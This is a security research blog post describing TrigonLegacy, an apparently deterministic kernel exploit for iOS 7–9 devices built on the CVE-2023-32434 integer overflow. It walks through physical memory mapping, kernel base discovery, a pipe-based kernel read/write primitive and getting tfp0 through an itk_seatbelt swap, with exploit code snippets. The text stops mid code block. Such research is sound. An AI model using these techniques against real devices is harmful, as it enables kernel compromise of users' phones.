---
title: TrigonLegacy - Deterministic iOS 7.x-9.x tfp0
date: 2026-06-27
modified: 2026-06-27
tags: [iOS, jailbreak, kernel]
description: TrigonLegacy exploits an integer overflow in the VM layer when creating memory entries. This allows arbitrary physical memory read/write, which is then used to build a tfp0 primitive. This exploit and the techniques used are entirely deterministic.
image: /assets/img/trigon-legacy/oracle.png
---
## Table of Contents
1. [Introduction](#introduction)
2. [The Bug](#the-bug)
   - [So, what was the bug?](#so-what-was-the-bug)
   - [So, what was the fix?](#so-what-was-the-fix)
3. [Exploitation](#exploitation)
   - [Lost in the Middle of Nowhere](#lost-in-the-middle-of-nowhere)
     - [MMIO](#mmio)
   - [Kernel Base (and Friends)](#kernel-base-and-friends)
     - [Hunting boot_args](#hunting-boot_args)
   - [Building TFP0](#building-tfp0)
     - [Finding kernel_task](#finding-kernel_task)
     - [Gotta go fast](#gotta-go-fast)
     - [I am speed](#i-am-speed)
       - [Pipes](#pipes)
       - [Determinism](#determinism)
4. [Conclusion](#conclusion)

---

## Introduction

[Trigon](https://github.com/alfiecg24/Trigon), the kernel exploit by [alfiecg24](https://github.com/alfiecg24), was released **March 1st 2025**, and features an interesting twist to achieving kernel read/write primitives: **it's one of the first completely deterministic XNU kernel exploits**.
Completely by chance, the **TrigonLegacy** exploit was released **February 28th 2026**, one day before the one year anniversary of [Trigon](https://github.com/alfiecg24/Trigon)'s release.

Powered by an ancient integer overflow in the VM layer, present since the early days of XNU, and exploited by [staturnz](https://github.com/staturnzz) in [oob_entry](https://github.com/staturnzz/oob_entry) down to **iOS 3(!)**, this bug provides an excellent primitive for kernel exploitation.

<figure>
<img src="{{ '/assets/img/trigon-legacy/oobentry.png' | relative_url }}" alt="oob_entry">
<figcaption>oob_entry by staturnz running in iOS 3</figcaption>
</figure>
 
With the bug being present in [xnu-124](https://github.com/apple-oss-distributions/xnu), the first XNU release at Apple's GitHub, this bug was introduced **before the first iOS version (iOS 1) was released**. It transcended all iOS versions up to iOS 16.5, across multiple architectures, and across hundreds of security patches and security mitigations introduced by Apple, lasting at least 17 years! The bug was assigned CVE-2023-32434 and was patched in the [iOS 16.5.1 update](https://support.apple.com/en-us/103837), after being actively exploited, notably in [Operation Triangulation](https://securelist.com/operation-triangulation-the-last-hardware-mystery/111669/).

Seeing all of this, I wanted to take a look at this bug and take my own spin at writing an exploit. [Trigon](https://github.com/alfiecg24/Trigon) makes use of some modern techniques, some of which are not even possible on older iOS versions. This made me curious: **how far could I push the primitive on older iOS versions**, which contain security weaknesses that were patched over the years, and its own share of bugs and weird reliability issues that were fixed over the years.

**This is the philosophy behind TrigonLegacy: a deterministic kernel exploit that achieves tfp0, but doing so using techniques that can only be applied to legacy devices. TrigonLegacy targets A7, A8(X) and A9(X) devices, from iOS 7 to iOS 9.**

## The Bug

The bug is remarkably simple, yet effective:
```c
// snippet from xnu-3247 mach_make_memory_entry_64
if((offset + map_size) > parent_entry->size) {
  kr = KERN_INVALID_ARGUMENT;
  goto make_mem_done;
}
```

As mentioned above, this bug survived through _many_ XNU versions, through several changes and new checks added to the buggy `mach_make_memory_entry_64` function over the years, including some variable names involving the bug changing, but the buggy check remained the same. A perfect example of tunnel vision.
This is a very simple bounds validation, which is supposed to prevent creating a child memory entry which would go past the bounds of its parent memory.

### So, _what was the bug_?

All the variables involved in this calculation are attacker controlled! This is by no means an issue _if **ALL** checks were done properly_, but as we know, they're not.

The variables in question:
* `offset` = attacker supplied offset when creating the memory entry
* `map_size` = size of the memory entry
* `parent_entry->size` = attacker supplied size of parent memory entry


This function was vulnerable to a very _basic_ **integer overflow**! The left side of the check, **`offset + map_size`**, can overflow and turn into a value equal to or smaller than the right side, **`parent_entry->size`**. That makes the check pass when it should fail, resulting in **out-of-bounds memory access**.

Let's show an example:
```c
offset = 0x2000;
map_size = 0xfffffffffffff000;
parent_entry->size = 0x4000;
```
The result of `offset + map_size` will overflow and turn into `0x1000`. `0x1000` is smaller than `0x4000`, so the check passes and we're able to create the memory entry.

We are now able to map arbitrary memory as we wish since we have a **huge** mapping, but as we will see, we shouldn't let our greed get the better of us.

<center><strong>About tunnel vision...</strong></center>
<details markdown="1">
<summary>A fun story about tunnel vision and everyone looking at the wrong buggy check for years</summary>
Our first contact with the specifics of this bug was in December 2023, when [Kaspersky’s Global Research and Analysis Team](https://www.kaspersky.com/about/press-releases/kaspersky-discloses-iphone-hardware-feature-vital-in-operation-triangulation-case) presented [Operation Triangulation at 37c3](https://www.youtube.com/watch?v=1f6YyH62jFE&t=1086s). There they presented an unknown iOS zero-click exploit chain that relied on a hardware vulnerability. One of the key parts of the exploit chain was a kernel exploit, which later turned into the Trigon we know. Alfie later posted an [excellent writeup](https://alfiecg.uk/2025/03/01/Trigon.html#vulnerability) on the vulnerability and exploiting it, also referencing the exact same code block.
<figure>
<img src="{{ '/assets/img/trigon-legacy/wrong-trigon.png' | relative_url }}" alt="wrong-trigon">
<figcaption>(Wrong?) Trigon at 37c3</figcaption>
</figure>
But the check presented above is NOT reachable by _normal_ means.
In XNU, this check is gated behind
```c
if (use_data_addr || use_4K_compat) {
```
and if we go to the top of the function we find...
```c
use_data_addr = ((permission & MAP_MEM_USE_DATA_ADDR) != 0);
use_4K_compat = ((permission & MAP_MEM_4K_DATA_ADDR) != 0);
```
This check is gated behind either of these two flags we can pass when creating the memory entry. These flags basically tell XNU to either align data to 4K pages or to save the exact offset we specify inside the mapping we're creating the memory entry in, instead of rounding/truncating.<br/>
Now, could **we** pass these flags when creating a memory entry? 
* Yes.

Will the bug actually trigger? 
* Well, yes, _if everything lines up properly._<br/>

The bug exists in this codepath but 99.9% of the time, we'll be hitting the codepath we've specified in [The Bug](#the-bug), not this one, since we've not specified any flags.

#### Validation
_But what if we inherited the flags from somewhere?_

Fear not, we can easily validate this by dumping the objects in kernel memory.
We can find the port pointer for both memory entry handles in our own task's ipc_entry table. From there, we access the underlying vm_named_entry object by accessing the ip_kobject field for the target port.

```c
Parent Entry
vm_named_entry backing.object: 0xffffff80033eb078
vm_named_entry offset: 0x0
vm_named_entry size: 0x4000
vm_named_entry data_offset: 0
vm_named_entry protection: 0x3
vm_named_entry ref_count: 1
vm_named_entry flags: internal=1, is_sub_map=0, is_pager=0, is_copy=0
```
```c
Child Entry
child vm_named_entry backing.object: 0xffffff80033eb078
child vm_named_entry offset: 0x6f1000
child vm_named_entry size: 0xfffffffffffff000
child vm_named_entry data_offset: 0
child vm_named_entry protection: 0x3
child vm_named_entry ref_count: 1
child vm_named_entry flags: internal=1, is_sub_map=0, is_pager=0, is_copy=0
```
The flag isn't set in `protection` (because it's stripped, with its value being `VM_PROT_DEFAULT`) and no `data_offset` is present, because the flag is not set. Even if we specify an odd offset when creating the memory entry, everything will be rounded/truncated to page boundaries. If the flag was set, and we specified an odd offset we'd see something like
```c
child vm_named_entry data_offset: 0x123
```
So tunnel vision caused the bug, and tunnel vision also made us overlook the actual codepath we were hitting when exploiting this.
</details>

### So, _what was the fix_?

Before the original check, an overflow check was added.
```c
// snippet from xnu-10063 mach_make_memory_entry_64
if (__improbable(os_add_overflow(offset, map_size, &tmp))) {
  kr = KERN_INVALID_ARGUMENT;
  goto make_mem_done;
}
if ((offset + map_size) > parent_entry->size) {
  kr = KERN_INVALID_ARGUMENT;
  goto make_mem_done;
}
```

If the sum results in an overflow, `os_add_overflow` will return **True**, and the creation of the memory entry will fail. Some more overflow checks were added all around the function, including the `MAP_MEM_4K_DATA_ADDR` or `MAP_MEM_USE_DATA_ADDR` codepath.

## Exploitation

The process of acquiring the initial physical mapping primitive is pretty straightforward.
First of all, we'll create a memory backing for the memory entries. We create an **IOSurface**, with its backing memory region being `PurpleGfxMem`.
This gives us two useful properties:
- First, the memory will be physically contiguous and will always come from the same underlying memory region. That matters because, for physically contiguous mappings, the kernel can resolve a page by taking the entry’s physical base address and a relative offset. If the memory were not physically contiguous, XNU would instead follow the normal VM path: it would look up the relevant `vm_page`, or allocate a new one, with the backing page coming from the free list.
- Second, the `vm_named_entry` objects for our entries will have the `internal` flag set, which will allow us to bypass some internal checks in XNU since `internal` entries will be treated differently by parts of XNU,which would otherwise block us from mapping arbitrary physical pages.

Unfortunately, in iOS 7, attempting to create an **IOSurface** using `IOSurfaceCreate` in `PurpleGfxMem` doesn't work. We're in luck though, because `create_default_fb_surface` (which is where the default framebuffer surface is created) creates an IOSurface with its memory backed by `PurpleGfxMem`, so we can just snatch that! This surface has just one little difference to the one we create in iOS 8 and 9, but we'll discuss this later when finding the kernel base address. This trick was found by [staturnz](https://github.com/staturnzz) and is used in [oob_entry](https://github.com/staturnzz/oob_entry/blob/main/src/oob_entry.c#L14-L28), from iOS 3 to iOS 7.

<figure markdown="1">
```c
// Get default framebuffer surface on iOS
service = IOServiceGetMatchingService(kIOMasterPortDefault, 
          IOServiceMatching("AppleCLCD"));
IOMobileFramebufferOpen(service, mach_task_self(), 0, &client);
IOMobileFramebufferGetLayerDefaultSurface(client, 0, &surface);
```
<figcaption>Getting the default framebuffer surface on iOS 7 </figcaption>
</figure>

<figure>
<img src="{{ '/assets/img/trigon-legacy/fb.png' | relative_url }}" alt="fb">
<figcaption>create_default_fb_surface in iOS 7</figcaption>
</figure>

Afterwards, we'll create 2 memory entries:

* `parentEntry`: just a regular memory entry, with its backing memory being the IOSurface we just got
* `childEntry (largeMemoryEntry)`: the memory entry we'll use to trigger the bug and map arbitrary physical pages. We'll set its `parent_entry` to the `parentEntry` we created in the step above, we'll set its size to `UINT64_MAX - page_size + 1` and its offset to 2x the page size for the target device. This will cause an overflow, bypass all size checks, and allow us to map whatever physical pages we want since we now have access to a memory entry with a ridiculous large size.

We can now use `mach_vm_map` specifying our `largeMemoryEntry` as the object we'll be mapping from and any offset from the object we wish to map the memory at such offset from our mapping.

### Lost in the Middle of Nowhere

All good now, just need to find the kernel base right? We just scan back from our mapping since we're in VRAM, maybe skip a gigabyte or two since we're pretty far it, find it and call it a day? Wrong.
```c
panic(cpu 0 caller 0xffffff8006af8ae8): 
"Spinlock timeout 0xffffff8108081f38 = 18446743528409671681"
``` 
When mapping back from our mapping, we'll eventually start hitting process memory and random kernel structures in physical memory which, when such a page is faulted in, may result in corruption in the VM layer, resulting in a **Spinlock panic**. This is obviously not ideal, so we need a different way to find the kernel base.

If we start mapping forwards, after some time, we won't hit a Spinlock panic, but we'll instead start hitting **unmapped memory**, which will also result in a panic. As such, we first need a way to determine where exactly in physical memory our memory entry starts.

We could hardcode our mapping base but:
- It changes between devices and on random iOS versions
- It's not 100% guaranteed to be in the same place when running the exploit more than once on a single boot

In order to dynamically find the mapping base, [Trigon](https://github.com/alfiecg24/Trigon) will look for the **iBoot Handoff** region. This region will contain several physical addresses for various regions of physical memory, including its own physical location. Unfortunately iboot-handoff was only introduced in iOS 12, so we can't use that for TrigonLegacy.

Instead, we can abuse the fact that the devices we're targeting contain a different, static region in physical memory, which we can use to find our mapping base. We can find the **sleep token buffer base**, a region of memory which is at a fixed place in physical memory every boot and which is used to store the sleep token.

The **sleep token** is a 16-byte value which is encrypted with the device's UID key, and which is used to validate the device state when waking the device from sleep. It is present on devices which need to go through the **Bootrom and LLB** to resume execution, which is valid for A8(X) devices and below. For A9 devices, Apple started using the **reconfig engine**. The **reconfig engine**, among other things, is used to configure the device after deep sleep, avoiding going through **Bootrom and LLB**, and eliminating the need for a sleep token.

**_But wait just a minute. Didn't you just say that A9 uses the reconfig engine and has no use for a sleep token?_**  

Is what you're probably asking right now. Well, you're not wrong, but the information given above isn't wrong either.
A9 doesn't have a use for a sleep token **but its memory region still exists in iOS 9!**
This memory region never existed on A10 and was removed in iOS 10 for A9, so Apple probably just forgot about it altogether for the first major iOS version release for A9.

<details markdown="1">
<summary>Finding the sleep token buffer base</summary>
We can find the sleep token buffer base by booting PongoOS and looking for its entry in the device tree: `stram`, which likely stands for `Sleep Token RAM`. When we try to find it on A9 in iOS 10 or on A10 and above, nothing will be present in the device tree.
```bash
Booted by: iBoot-2817.50.3
Built with: Clang 15.0.0 (clang-1500.0.40.1)
Running on: Apple A9 (S8000, Samsung)
pongoOS> dt stram
AAPL,phandle                     0x0f000000
device_type                      stram
name                             stram
reg                              00 80 77 7e 08 00 00 00  00 40 00 00 00 00 00 00   |..w~.....@......|
```
Here we can see that the sleep token buffer base is at physical address `0x87e778000`, and has a size of `0x4000` bytes.
</details>

After hardcoding the address for the sleep token buffer base which we found through PongoOS (or by looking into LLB), we can continuously map forwards until we find the magic value `XSOMNNUR`, which is the start of the sleep token signature. We can then subtract the offset from our mapping address we're mapping at from the hardcoded address of the sleep token buffer base to find the exact physical address of our mapping.

```c
Found sleep token buffer base at 0x720000
Mapping base is 0x87e058000
```

#### MMIO

With this, we can now start mapping from **DRAM base (0x800000000)** to find the kernel header, and then parse that to find the kernel base virtual address. But we can do better. For A7 and A8 devices, the kernel will always be at the same physical address every boot. There's no physical kernel slide. For A9 there's a physical slide, but we'll discuss that in a bit.

Turns out, the physical location of the kernel header in memory for these 2 SoCs is entirely predictable.

```bash
Found TZ0: 0x800000000 -> 0x800600000
Found TZ1: 0x83f700000 -> 0x83f800000
Physical Kernel base 0x800604000, Offset from mapping base 0x3eeed000
```

The kernel header will always be located _right after_ the end of the last **TrustZone** region at the start of DRAM. **If only TZ0 is at the start of DRAM**, the kernel header will be right after the end of TZ0. **If both TZ0 and TZ1 are at the start of DRAM**, the kernel header will be right after the end of TZ1. **If both TZ0 and TZ1 are at the end of DRAM** (if TZ0 isn't at the start of DRAM), we cannot predict the physical location of the kernel header, so we return a minimum guess.

The reason we cannot use this technique for iOS 7 is because we are unable to read **MMIO**. We're specifically checking the same registers which are used to exploit `blackbird`, a **SEPROM bug**, to find out exactly where the **TrustZones** are. These registers are part of the device's **memory-mapped I/O (MMIO)** space. Such regions are configured as **non-cacheable** (device memory) so that reads and writes go directly to the hardware. While with the Surface we create ourselves in `PurpleGfxMem` for iOS 8 and 9 we can supply `kIOMapInhibitCache` on the `IOSurfaceCacheMode` property to prevent it from being cached, we cannot do that for iOS 7 since we cannot create such a Surface there, and we can't alter its attributes to add it. As such, for iOS 7, we'll return a minimum guess, which seems to work fine, albeit just a little slower.

For A9, we'll have to dig a little bit deeper.
Up to around iOS 12, iOS had a very weak **KASLR** implementation. The **virtual** kernel slide could only have 256 possible values, incrementing every 2MiB every slide to a maximum of 512MiB, making bruteforcing it trivial. On the other end, the **physical** kernel slide is derived from the virtual slide, extracting the offset within a 32MiB block (L2 block size).

<figure markdown="1">
```c
phys_slide = (virt_slide & (L2_BLOCK_SIZE - 1));
```
<figcaption>Physical Slide calculation for A9</figcaption>
</figure>

If granularity is 2MiB and the maximum slide is 32MiB... That means there's only **16 possible physical kernel slides!** And the best of all is that we can try mapping every single one of them until we find the kernel header, since we're in DRAM and everything is mapped! This is a huge speed up of around 2000x when finding the kernel header. _Mapping way less random pages also helps with the fact that the device would sometimes unexplicably panic with a null deref a few seconds after the exploit ran. This does not happen on the release version of TrigonLegacy, of course._

### Kernel Base (and Friends)

To recap, we currently have:
* Our mapping base in physical memory
* The physical address of the kernel header

But how do we use this to our advantage? What do we need to find in order to actually build tfp0?
At this moment, we _only_ have physical primitives, but we need to find a way to build virtual read/write. To achieve this, we first need to translate the virtual addresses we read into physical addresses (`kvtophys`). For this, we need to parse the translation tables. First off, this requires obtaining the base address of the root translation table, which is the value of `TTBR1_EL1` (or `cpu_ttep`).

For this, we'll need to start patchfinding the kernel using known magic values and going from there. Or we avoid doing so altogether and use a little trick since this is TrigonLegacy after all?
It so happens that the location of `cpu_ttep` is also entirely **deterministic**. For this, we'll resort to a little reverse engineering.

<figure markdown="1">
```c
void arm_vm_init(vm_size_t memory_size, boot_args *boot_args)
{
  /** ... **/
  avail_start = boot_args->topOfKernelData + 0x10000;
  invalid_ttep = avail_start;
  invalid_tte = avail_start - v3 + v2;
  bzero(invalid_tte, 0x4000u);
  avail_start += 0x4000;
  cpu_ttep = avail_start; // cpu_ttep = boot_args->topOfKernelData + 0x10000 + 0x4000
  cpu_tte = avail_start - gPhysBase + gVirtBase;
  /** ... **/
}
```
<figcaption>cpu_ttep calculation</figcaption>
</figure>

#### Hunting boot_args

When looking for easy ways to patchfind `cpu_ttep` I stumbled upon `arm_vm_init`. This is one of the first functions executed and is responsible for setting up the kernel's virtual memory (VM) and early allocations. It's very easy to spot in the pseudocode that the allocation of `cpu_ttep` is always located at `boot_args->topOfKernelData + 0x10000 + 0x4000`. Which means that, if we're able to find the `boot_args` structure in memory, we've instantly also found `cpu_ttep`. With the kernel base in hand, we can start to parse it to get some more information and start this hunt for `boot_args`.

By parsing the kernel Mach-O header, we learn a few things:
- The __TEXT segment's virtual address (`vmaddr`), is going to be the virtual base of the kernel
- When parsing __PRELINK*, we get information on segment locations
- Since the kernel image is going to be physically contiguous, we can calculate the offsets from the virtual addresses and convert them to the physical addresses, at least for the kernel image.

After that, I dumped the memory map using PongoOS to understand the physical layout of the kernel image and the regions that follow it:

<figure>
<img src="{{ '/assets/img/trigon-legacy/memorymap-dl.svg' | relative_url }}" alt="Kernel memory layout">
<figcaption>Memory map from iOS 8.4 iPhone 6</figcaption>
</figure>

The boot_args region is located after the DeviceTree, which is also just after the last segment of the Kernel image. So if we find the last segment, we'll find DeviceTree, and we'll be very close to finding boot_args. Very simple, now we just find the end of `__PRELINK_INFO`, map a few pages forwards, look for the boot_args magic and we're in business. The issue here is that older jailbreaks (mainly iOS 7) liked to use the end of the Kernel's mach_header as scratch space for their sandbox shellcode, which will overwrite the last few load commands. We'll use `__PRELINK_TEXT` since from all testing that seems to be fine, and it's just a few pages before `__PRELINK_INFO`, not impacting the speed of the exploit much. After that, we'll look for the `boot_args` magic, and only then have we found the `boot_args` struct, from which we can extract `topOfKernelData` and finally, `cpu_ttep`.

<figure markdown="1">
```c
pongoOS> bootargs
gBootArgs:
	Revision: 0x1
	Version: 0x2
	virtBase: 0xffffff800b400000
	physBase 0x800e00000
	memSize: 0x3dbff000
	topOfKernelData: 0x8021d0000
	deviceTreeP: 0xffffff800c7a7000
	deviceTreeLength: 0x27ae0
```
<figcaption>boot_args dump (trimmed for brevity)</figcaption>
</figure>

In this example, with `topOfKernelData` starting at `0x8021d0000`, `cpu_ttep` would be `0x8021d0000 + 0x10000 + 0x4000 = 0x8021E4000`. And with that, `kvtophys` is sorted. We can now convert virtual addresses to physical addresses by traversing the kernel's translation tables. We have all the tools we need to hunt for tfp0.

### Building TFP0

<q>TFP0</q> is the name the jailbreaking community gave to having a send right to the kernel task, basically having an `ipc_port` with its `kobject` being the `kernel_task`. This will give you full control over the kernel task's `vm_map`, which is the full kernel memory. It will also allow us to use the `mach_vm_*` APIs to manipulate kernel memory, that being reading, writing, allocating new memory, and whatever else these APIs allow. This is a very convenient way to do kernel read/write, without the need for building read/write primitives by using other objects/APIs.

What's actually necessary for a port to be a <q>tfp0</q> port? It's actually really simple.
- The port's `IP_RECEIVER` needs to point to `ipc_space_kernel`
- The port's `IP_KOBJECT` needs to point to `kernel_task` (or a fake task structure for iOS 10.3+)
- The port's `IE_BITS` needs to have `IE_BITS_SEND` set (it needs to be a _send_ right, not a _receive_ right)

We can either patch an existing port to turn it into a tfp0 port or we can simply get a kernel task port with some tricks. We'll explain this further later in the post.

To find `ipc_space_kernel` is very simple, we just need to read the `IP_RECEIVER` from a port where we know the receiver is `ipc_space_kernel`, which is the case for `mach_task_self()`! All task ports will have `IP_RECEIVER` pointing to `ipc_space_kernel`.

#### Finding kernel_task

Finding `kernel_task`'s address is a little bit trickier. The easiest way to find it is finding `kernproc`'s address first, which is the kernel's `proc` structure. Retrieving `kernel_task` in this case is as simple as reading the `task_bsd_info` field in the `proc` structure. <q>We're in luck! `kernproc` is an exported symbol on the kernel in these versions, so we can grab just that!</q> is what I would like to say, but things aren't that easy.

<figure markdown="1">
```bash
❯ nm -gU kcache932a9.dec | grep "_kernproc"
ffffff8004536090 S _kernproc
```
<figcaption>kernproc exported symbol</figcaption>
</figure>

I quickly wrote a simple program to run it against a static decrypted kernel before running it on the live kernel (since our primitive is weird, I always ran against a static kernel first):

<figure markdown="1">
```c
❯ gcc parser.c -o parser && ./parser kcache932a9.dec
Fake kbase is 0xffffff8004004000
Prelink 0xffffff8005dd4000
symtab in the house! nsyms 4269, symtab offset 0x565688
Found _kernproc: 0xffffff8004536090
```
<figcaption>Symbol parser output</figcaption>
</figure>

All seemed to line up, but when actually implementing this into TrigonLegacy, it wouldn't find the exported symbol...

<figure markdown="1">
```c
kernel_section_t * sect;
sect = getsectbyname("__PRELINK", "__symtab");
if (sect && sect->addr && sect->size) {
    ml_static_mfree(sect->addr, sect->size);
}
```
<figcaption>Symtab freeing</figcaption>
</figure>

I completely forgot the Symbol Table is wiped on runtime, unless we specified the `keepsyms=1` bootarg. And it's obviously not there on a stock iOS device. So the next obvious step was to patchfind `kernproc`. After searching for a bit, I found this beautiful oracle. The `MOV W8, #0x1086` instruction is unique from iOS 7 throughout iOS 9 and the `LDR` instruction immediately before it contains exactly what we're looking for.

<figure>
<img src="{{ '/assets/img/trigon-legacy/oracle.png' | relative_url }}" alt="_kernproc oracle">
<figcaption>_kernproc oracle</figcaption>
</figure>

After patchfinding `kernproc`, we access its `task_bsd_info` field to get its task struct, which will be `kernel_task`.
We are now able to find our process and build that `tfp0` port!

For that we'll iterate the `proc` linked list and find our process.

<figure markdown="1">
```c
uint32_t our_pid = getpid();
while (proc) {
    uint32_t pid = early_rk32(proc + 0x10);
    if (pid == our_pid) {
        our_proc = proc;
    } else if (pid == 0) {
        kern_proc = proc;
    }
    proc = early_rk64(proc + 0x8);
}
```
<figcaption>Finding our process</figcaption>
</figure>

This approach has a few issues, though:
- **It's really slow.** Patchfinding `kernproc` takes a while, since our oracle is around the middle of the kernel binary.
- **It's not deterministic.** If `proc` dies while we iterate, we'll get a null deref and **panic**.

#### Gotta go fast

500ms for an exploit to run wasn't acceptable in my book. Not being deterministic was also a no-go. So I started looking for alternatives, bonus points if I could use existing objects from the current exploit. If I could leak an interesting object, I could traverse the kernel's memory with our primitive and eventually get to our process, while doing way less operations than when patchfinding.

One very interesting bug was `CVE-2020-3836`, an `ipc_port` pointer disclosure and as simple as info leaks get. Dubbed [cuck00](https://blog.siguza.net/cuck00/) by [Siguza](https://github.com/Siguza), all that's necessary to trigger the info leak is:
- call IOSURFACE_SET_NOTIFY with a mach port
- call `IOSurfaceIncrementUseCount` followed by `IOSurfaceDecrementUseCount`
- receive the message on that same mach port, message which will contain that same mach port's address.

Since our kernel bug is making use of an `IOSurface`, we can reuse that here.

<figure markdown="1">
```bash
service: f03
client: 1307, (os/kern) successful
newSurface: 0x15ed12550, id: 186
setNotify: (os/kern) successful
incrementUseCount done
decrementUseCount done
mach_msg: (os/kern) successful
Port addr: 0xffffff810a6d7c40
```
<figcaption>cuck00 port info leak</figcaption>
</figure>

From there, all we need to do is a handful of kernel reads and we get to our `proc` struct's address.

<figure markdown="1">
```bash
Port addr: 0xffffff810a6d7c40
Receiver: 0xffffff810801f200
Self task: 0xffffff8108ca8db0
Self proc: 0xffffff8108654040
```
<img src="{{ '/assets/img/trigon-legacy/ipc_port_to_proc.svg' | relative_url }}" alt="ipc_port to proc">
<figcaption>Going from ipc_port to proc</figcaption>
</figure>


We no longer need to patchfind `kernproc`, we can now iterate through the `proc` linked list, until we find a `proc` struct with `pid == 0` and we've found `kernproc`. We're now able to build a `tfp0` port!


#### I am speed

<figure>
<img src="{{ '/assets/img/trigon-legacy/speed.png' | relative_url }}" alt="speed">
</figure>

Although the approach discussed before was faster, it's still not perfect. We still need to iterate through the `proc` linked list, which makes it not deterministic. Our primitive is also slow and it _may_ result in a spinlock panic if we read some types of kernel structures, so I've decided to pivot. 

##### Pipes

Pipes are objects which are usually used to transfer data between processes. You write data into one end of the pipe (the "write" end) and you can read that exact same data from the other end (the "read" end). This data is stored in a buffer in the kernel, a structure called "pipebuf", inside the `pipe` struct. A `pipebuf` keeps track of where the data is read and written from, using two fields, `in` and `out`. The `cnt` field tells us how much data is currently stored in the pipebuf, `size` is the max size of the pipebuf, and `buffer` is the pointer to the actual buffer.

<figure markdown="1">
```c
struct pipebuf {
	u_int	cnt;		/* number of chars currently in buffer */
	u_int	in;		/* in pointer */
	u_int	out;		/* out pointer */
	u_int	size;		/* size of buffer */
	caddr_t	buffer;		/* kva of buffer */
};

struct pipe {
  struct	pipebuf pipe_buffer;	/* data storage */
  /* don't care about the rest of the struct, we only care about pipebuf :) */
};
```
<figcaption>pipe struct</figcaption>
</figure>

We're able to turn pipes into a very strong r/w primitive, if we're able to control a pipe's `pipebuf`'s buffer address. If we point the buffer from `pipe 1` to the address of `pipe 2`, anything we write into `pipe 1` will overwrite the `pipebuf` struct of `pipe 2`! Meaning we get to control _where_ `pipe 2` reads or writes its data from/to, and _how much_ it thinks there is to read or to write in its buffer.

<figure>
<img src="{{ '/assets/img/trigon-legacy/pipe_pipebuf_pointer_diagram.svg' | relative_url }}" alt="piperw">
<figcaption>PipeRW visualized</figcaption>
</figure>

In the end, we just need to read from `pipe 1` to reset its `pipebuf` struct back to a default state and we're done. As for cleanup, all we have to do is to write the original buffer address back into the `buffer` field of the pipebuf struct of `pipe 1` (or set it to null and leak the original buffer if we're lazy).

<figure markdown="1">
```c
static uint64_t pipe_read_internal(uint64_t buffer_value, size_t read_size) {
    struct pipe_exploit_state* state = &dev_info->pipe_state;
    // create fake pipebuf
    struct pipebuf pb = {0};
    pb.cnt = read_size;
    pb.in = 0;
    pb.out = 0;
    pb.size = read_size;
    pb.buffer = buffer_value;
    // this writes over p2 pipebuf
    write(state->pipe1[1], &pb, sizeof(struct pipebuf));
    uint64_t reader = 0;
    // read from read end from p2
    read(state->pipe2[0], &reader, read_size);
    // reset pipe1 pipebuf
    read(state->pipe1[0], &pb, sizeof(struct pipebuf));
    return reader;
}
```
<figcaption>PipeRW read example</figcaption>
</figure>

##### Determinism

The last hurdle is determinism. Iterating the `proc` linked list isn't deterministic, so I had to come up with a better way to get to `kernel_task`. 

The `task` struct had a few more interesting fields worth exploring.

<figure markdown="1">
```c
struct ipc_port *itk_self;	/* not a right, doesn't hold ref */
struct ipc_port *itk_nself;	/* not a right, doesn't hold ref */
struct ipc_port *itk_sself;	/* a send right */
(...)
struct ipc_port *itk_host;	/* a send right */
struct ipc_port *itk_bootstrap;	/* a send right */
struct ipc_port *itk_seatbelt;	/* a send right */
(...)
struct ipc_space *itk_space;
```
</figure>

We have `itk_space`, which points to our task's ipc space, which contains essentially our task's collection of port rights, i.e. the ports we can use to communicate with other processes. We've used this object to find our `mach_task_self()`'s port in the kernel and figure out `ipc_space_kernel`.
The `itk_self` field is a raw pointer to the task's own control port, `itk_nself` is a raw pointer to the task name port ("name" port), an unprivileged version of the task port and `itk_sself` is what `mach_task_self()` will return to userspace.

`itk_bootstrap` stands out immediately, which is a send right to the bootstrap server. Since the bootstrap server is implemented by `launchd` that means we have in our own `task` struct an easy way to get to `launchd`'s `task`. Better yet, since `launchd` is the first userspace process created by the kernel and thus pid 1, and with `kernel_task` being pid 0, they're supposed to be right next to each other in the `proc` linked list!

<figure markdown="1">
<img src="{{ '/assets/img/trigon-legacy/task_to_launchd_task.svg' | relative_url }}" alt="task to launchd task">
<figcaption>Finding launchd task starting from our task</figcaption>
</figure>

If we then read `task_bsd_info` we get to `launchd`'s `proc` struct, if in the `proc` struct we read the `p_pid` field, we should read `1` given that `launchd` is pid 1. If we then iterate one task behind `launchd`'s task, we should end up at `kernel_task`! We verify that by again checking if `pid == 0` in `task_bsd_info`, which should be `kernproc`. Now all that's left is getting the kernel's task port. We can either [fake one](https://github.com/TheRealClarity/Trigon-Legacy/blob/main/Trigon-Legacy/trigon-legacy.c#L55-L103) or we can make the kernel do that work for us.

Remember how there were some interesting fields in the `task` struct? There was one we didn't talk about yet: `itk_seatbelt`. It's supposed to be a send right to the service responsible for sandbox operations, usually `sandboxd`. But what would happen if we temporarily switch up with... the kernel's task port?

<figure markdown="1">
```c
/*
 *	Routine:	task_get_special_port [kernel call]
 *	Purpose:
 *		Clones a send right for one of the task's
 *		special ports.
 *	Conditions:
 *		Nothing locked.
 *	Returns:
 *		KERN_SUCCESS		Extracted a send right.
 *		KERN_INVALID_ARGUMENT	The task is null.
 *		KERN_FAILURE		The task/space is dead.
 *		KERN_INVALID_ARGUMENT	Invalid special port.
 */

kern_return_t
task_get_special_port(
	task_t		task,
	int		which,
	ipc_port_t	*portp)
{

	switch (which) {
	    case TASK_SEATBELT_PORT:
		port = ipc_port_copy_send(task->itk_seatbelt);
		break;
...
```
<figcaption>task_get_special_port as of XNU-3248</figcaption>
</figure>

Yep, as it turns out, the kernel will happily give us its own task port if we just ask nicely!

<figure markdown="1">
```c
uint64_t kernel_itk_self = pipe_read_64(kernel_task + offsets->task_itk_self);
DEBUG("Kernel itk self: %#llx", kernel_itk_self);
uint64_t old_seatbelt_port_addr = pipe_read_64(self_task + offsets->task_itk_seatbelt);
DEBUG("Old seatbelt port addr: %#llx", old_seatbelt_port_addr);
pipe_write_64(self_task + offsets->task_itk_seatbelt, kernel_itk_self);
DEBUG("Wrote kernel port addr to itk seatbelt");

task_get_special_port(mach_task_self(), TASK_SEATBELT_PORT, &tfp0);
pipe_write_64(self_task + offsets->task_itk_seatbelt, old_seatbelt_port_addr);
DEBUG("Restored seatbelt port addr");
LOG("tfp0: %x", tfp0);
```
</figure>

With this, we've achieved our goal of getting `TFP0`, all that's left is cleaning up the pipe state and deallocating the memory entries we've used.

<details markdown="1">
<summary>TFP0, fake task and iOS 10.3+</summary>

Before iOS 10.3, all we needed was a send right to the kernel task. But with iOS 10.3, Apple got smart and introduced a new check: `task_conversion_eval`.

<figure markdown="1">
```c
